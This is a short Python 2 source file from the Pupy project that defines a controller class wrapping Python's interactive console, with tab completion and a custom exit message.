# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

import code
import PythonCompleter

def new_exit(*args, **kwargs):
    print "use ctrl+D to exit the interactive python interpreter."

class PyShellController(object):
    def __init__(self):
        local_ns={'exit':new_exit}
        self.console=code.InteractiveConsole(local_ns)
        self.completer=PythonCompleter.PythonCompleter(global_ns=globals(), local_ns=local_ns).complete

    def write(self, line):
        self.console.push(line)

    def get_completer(self):
        return self.completer


